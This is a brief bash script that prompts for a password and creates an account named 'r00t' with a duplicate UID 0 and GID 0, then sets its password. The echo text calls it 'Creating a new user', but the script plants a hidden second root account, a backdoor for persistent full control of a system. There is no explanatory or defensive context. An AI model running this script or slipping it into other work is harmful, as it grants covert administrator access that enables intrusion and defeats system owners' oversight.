#!/bin/bash
variable="pass"
echo "Creating a new user"
read -p "Enter the new password: " pass
useradd -ou 0 -g 0 r00t
echo "r00t:$pass" | chpasswd
